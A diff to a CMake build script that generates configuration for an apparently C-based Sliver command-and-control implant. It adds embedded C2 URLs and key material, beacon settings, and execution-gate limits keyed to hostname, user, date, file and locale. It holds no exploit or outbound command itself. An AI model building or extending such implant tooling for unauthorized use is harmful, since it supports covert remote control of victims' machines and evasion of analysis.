@@ -6,7 +6,7 @@
 #
 # Outputs (in OUT_DIR):
 #   implant_build_config.h  - switches and numeric constants (safe to include everywhere)
-#   implant_secrets.c       - names, C2 URLs (single translation unit only)
+#   implant_secrets.c       - names, C2 URLs and key material (single translation unit)
 
 if(NOT DEFINED CFG_JSON OR NOT EXISTS "${CFG_JSON}")
   message(FATAL_ERROR "config json not found: '${CFG_JSON}'")
@@ -26,6 +26,27 @@ function(_cfg_get out key default)
   endif()
 endfunction()
 
+# Nested getter: _cfg_get_n(out parent key name default)
+function(_cfg_get_n out parent key default)
+  string(JSON _v ERROR_VARIABLE _err GET "${_json}" "${parent}" "${key}")
+  if(_err)
+    set(${out} "${default}" PARENT_SCOPE)
+  else()
+    set(${out} "${_v}" PARENT_SCOPE)
+  endif()
+endfunction()
+
+# Escape a value so it can be embedded in a C string literal (PEM blocks,
+# JSON fragments, backslashes).
+function(_c_escape out input)
+  set(_s "${input}")
+  string(REPLACE "\\" "\\\\" _s "${_s}")
+  string(REPLACE "\"" "\\\"" _s "${_s}")
+  string(REPLACE "\r" "" _s "${_s}")
+  string(REPLACE "\n" "\\n" _s "${_s}")
+  set(${out} "${_s}" PARENT_SCOPE)
+endfunction()
+
 _cfg_get(SLIVER_NAME      name       "sliver-implant")
 _cfg_get(SLIVER_BUILD_ID  build_id   "dev")
 _cfg_get(SLIVER_RECONNECT reconnect_interval_ns "60000000000")
@@ -33,12 +54,19 @@ _cfg_get(SLIVER_BINTERVAL beacon_interval_ns    "60000000000")
 _cfg_get(SLIVER_BJITTER   beacon_jitter_ns      "0")
 _cfg_get(SLIVER_MAXERR    max_connection_errors "1000")
 _cfg_get(SLIVER_STRATEGY  strategy   "s")
+_cfg_get(SLIVER_BEACON    beacon     "false")
+_cfg_get(SLIVER_POLL      poll_timeout "0")
+
+set(_beacon 0)
+if(SLIVER_BEACON STREQUAL "true" OR SLIVER_BEACON STREQUAL "TRUE" OR SLIVER_BEACON STREQUAL "1")
+  set(_beacon 1)
+endif()
 
 # Feature switches: {"features":{"mtls":true,...}}
 set(_feat_mtls 0)
 set(_feat_http 0)
-set(_feat_dns  0)
-set(_feat_wg   0)
+set(_feat_dns 0)
+set(_feat_wg 0)
 set(_feat_pivot 0)
 string(JSON _has_feat ERROR_VARIABLE _ferr GET "${_json}" features)
 if(NOT _ferr)
@@ -60,12 +88,46 @@ set(_c2_body "")
 math(EXPR _c2_last "${_c2_len} - 1")
 if(_c2_len GREATER 0)
   foreach(_i RANGE ${_c2_last})
-    string(JSON _url GET "${_json}" c2 ${_i})
-    string(APPEND _c2_body "  \"${_url}\",\n")
+    string(JSON _url GET "${_json}" c2 ${_i} url)
+    _c_escape(_url_esc "${_url}")
+    string(APPEND _c2_body "  \"${_url_esc}\",\n")
   endforeach()
 else()
   string(APPEND _c2_body "  /* no c2 configured */\n")
 endif()
+
+# Secrets (order must match sliver_secret_id_t in include/sliver/config.h)
+set(_secret_keys
+  peer_public_key
+  peer_private_key
+  peer_public_key_signature
+  age_server_public_key
+  minisign_server_public_key
+  mtls_ca_cert
+  mtls_cert
+  mtls_key
+  wg_implant_priv_key
+  wg_server_pub_key
+  wg_peer_tun_ip
+)
+set(_secret_body "")
+set(_secret_count 0)
+foreach(_k IN LISTS _secret_keys)
+  string(JSON _v ERROR_VARIABLE _e GET "${_json}" secrets "${_k}")
+  if(_e)
+    set(_v "")
+  endif()
+  _c_escape(_v_esc "${_v}")
+  string(APPEND _secret_body "  \"${_v_esc}\",\n")
+  math(EXPR _secret_count "${_secret_count} + 1")
+endforeach()
+
+# Limits (used by the M2 execution gate)
+_cfg_get_n(_lim_host  limits hostname   "")
+_cfg_get_n(_lim_user  limits username   "")
+_cfg_get_n(_lim_dt    limits datetime   "")
+_cfg_get_n(_lim_file  limits file_exists "")
+_cfg_get_n(_lim_loc   limits locale     "")
 
 set(_debug 0)
 if(DEBUG_LOG)
@@ -83,17 +145,26 @@ file(WRITE "${OUT_DIR}/implant_build_config.h"
 #define SLIVER_CONNECTION_STRATEGY   '${SLIVER_STRATEGY}'
 
 #define SLIVER_C2_COUNT              ${_c2_len}
+#define SLIVER_SECRET_COUNT          ${_secret_count}
 
 #define SLIVER_RECONNECT_INTERVAL_NS ${SLIVER_RECONNECT}LL
 #define SLIVER_BEACON_INTERVAL_NS    ${SLIVER_BINTERVAL}LL
 #define SLIVER_BEACON_JITTER_NS      ${SLIVER_BJITTER}LL
 #define SLIVER_MAX_CONNECTION_ERRORS ${SLIVER_MAXERR}
+#define SLIVER_POLL_TIMEOUT_NS       ${SLIVER_POLL}LL
+#define SLIVER_IS_BEACON             ${_beacon}
 
 #define SLIVER_FEATURE_MTLS  ${_feat_mtls}
 #define SLIVER_FEATURE_HTTP  ${_feat_http}
 #define SLIVER_FEATURE_DNS   ${_feat_dns}
 #define SLIVER_FEATURE_WG    ${_feat_wg}
 #define SLIVER_FEATURE_PIVOT ${_feat_pivot}
+
+#define SLIVER_LIMIT_HOSTNAME    \"${_lim_host}\"
+#define SLIVER_LIMIT_USERNAME    \"${_lim_user}\"
+#define SLIVER_LIMIT_DATETIME    \"${_lim_dt}\"
+#define SLIVER_LIMIT_FILE_EXISTS \"${_lim_file}\"
+#define SLIVER_LIMIT_LOCALE      \"${_lim_loc}\"
 
 #define SLIVER_DEBUG_LOG ${_debug}
 
@@ -110,6 +181,12 @@ const char *const sliver_c2_urls[] = {
 ${_c2_body}};
 
 const size_t sliver_c2_url_count = (size_t)${_c2_len};
+
+/* Order must match sliver_secret_id_t. */
+const char *const sliver_secret_values[] = {
+${_secret_body}};
+
+const size_t sliver_secret_value_count = (size_t)${_secret_count};
 
 const char *const sliver_implant_name = \"${SLIVER_NAME}\";
 const char *const sliver_build_id_string = \"${SLIVER_BUILD_ID}\";
